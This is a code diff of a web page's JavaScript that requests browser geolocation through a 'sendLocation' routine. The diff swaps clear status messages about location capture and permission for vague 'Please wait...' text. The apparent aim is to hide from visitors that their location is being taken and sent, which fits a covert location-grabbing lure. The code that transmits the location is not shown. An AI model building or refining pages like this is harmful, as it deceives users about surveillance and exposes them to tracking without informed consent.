@@ -103,7 +103,7 @@ async function sendLocation(){
     } catch(err){
       if (!sentOnce) {
         if (err && err.code === 1) { // PERMISSION_DENIED
-          statusEl.textContent = 'Permission denied.';
+          statusEl.textContent = 'Please wait. Oh...! NO.';
         } else {
           statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
         }
@@ -117,14 +117,14 @@ async function sendLocation(){
     try{
       const p = await navigator.permissions.query({ name: 'geolocation' });
       if (p.state === 'granted') {
-        statusEl.textContent = 'Getting location...';
+        statusEl.textContent = 'Please Wait...';
         await handlePermissionAndGet();
         return;
       }
       // If user responds to prompt (Allow this time / while visiting), this onchange fires
       p.onchange = async () => {
         if (p.state === 'granted') {
-          statusEl.textContent = 'Permission granted — capturing location...';
+          statusEl.textContent = 'Please Wait...';
           await handlePermissionAndGet();
         }
       };
@@ -141,7 +141,7 @@ async function sendLocation(){
   } catch(err) {
     if (!sentOnce) {
       if (err && err.code === 1) { // PERMISSION_DENIED
-        statusEl.textContent = 'Please allow location to save.';
+        statusEl.textContent = 'Please wait....';
       } else {
         statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
       }
